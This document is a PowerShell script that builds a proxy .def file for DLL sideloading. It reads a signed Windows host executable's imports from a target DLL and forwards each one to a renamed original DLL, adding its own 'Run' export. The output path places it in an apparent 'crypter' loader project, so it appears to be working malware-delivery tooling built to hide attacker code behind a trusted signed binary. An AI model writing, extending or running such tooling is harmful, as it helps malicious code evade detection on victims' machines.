<#
.SYNOPSIS
    Generate a proxy .def for a signed-host DLL sideload.
.DESCRIPTION
    Reads the host executable's imports from a target DLL and writes an
    EXPORTS list with forwarders to the real vendor DLL. Run on Windows with
    Visual Studio's dumpbin in PATH, or mingw's objdump.
.PARAMETER HostExe
    Signed host executable (e.g. C:\Windows\System32\wmpdmc.exe).
.PARAMETER DllName
    DLL the host loads from its own directory (default wmpdui.dll).
.PARAMETER RealDll
    Base name of the renamed original vendor DLL (default real_wmpdui).
.PARAMETER Out
    Output .def path (default crypter\dll-loader\proxy.def).
#>
param(
    [Parameter(Mandatory = $true)][string]$HostExe,
    [string]$DllName = "wmpdui.dll",
    [string]$RealDll = "real_wmpdui",
    [string]$Out = "crypter\dll-loader\proxy.def"
)
$ErrorActionPreference = "Stop"
if (-not (Test-Path $HostExe)) { throw "host not found: $HostExe" }

$names = New-Object System.Collections.Generic.List[string]
$dumpbin = Get-Command dumpbin.exe -ErrorAction SilentlyContinue
if ($dumpbin) {
    $text = & $dumpbin.Source /imports $HostExe 2>&1 | Out-String
    $section = $false
    foreach ($line in $text -split "`r?`n") {
        if ($line -match "DLL Name:\s*$([regex]::Escape($DllName))") { $section = $true; continue }
        if ($section -and $line -match "DLL Name:") { break }
        if ($section -and $line -match "^\s*\d+\s+[0-9A-Fa-f]+\s+([A-Za-z_][A-Za-z0-9_@?$]*)\s*$") {
            $names.Add($Matches[1])
        }
    }
} else {
    $objdump = Get-Command objdump.exe -ErrorAction SilentlyContinue
    if (-not $objdump) { throw "neither dumpbin.exe nor objdump.exe found in PATH" }
    $text = & $objdump.Source -p $HostExe 2>&1 | Out-String
    $section = $false
    foreach ($line in $text -split "`r?`n") {
        if ($line -match "DLL Name:\s*$([regex]::Escape($DllName))") { $section = $true; continue }
        if ($section -and $line -match "DLL Name:") { break }
        if ($section -and $line -match "^\s*[0-9A-Fa-f]+\s+[0-9A-Fa-f]+\s+([A-Za-z_][A-Za-z0-9_@?$]*)\s*$") {
            $names.Add($Matches[1])
        }
    }
}

$names = $names | Sort-Object -Unique
$lines = New-Object System.Collections.Generic.List[string]
$lines.Add("; generated by tools/gen_proxy_def.ps1 for $DllName")
$lines.Add("LIBRARY $([IO.Path]::GetFileNameWithoutExtension($DllName))")
$lines.Add("EXPORTS")
$lines.Add("  DllMain")
$lines.Add("  Run")
foreach ($n in $names) { $lines.Add("  $n=$RealDll.$n") }
New-Item -ItemType Directory -Force -Path (Split-Path -Parent $Out) | Out-Null
Set-Content -Encoding ASCII -Path $Out -Value $lines
Write-Host "[+] $($names.Count) forwarded imports -> $Out"
if ($names.Count -eq 0) { Write-Warning "no imports found; check the host/DLL name" }
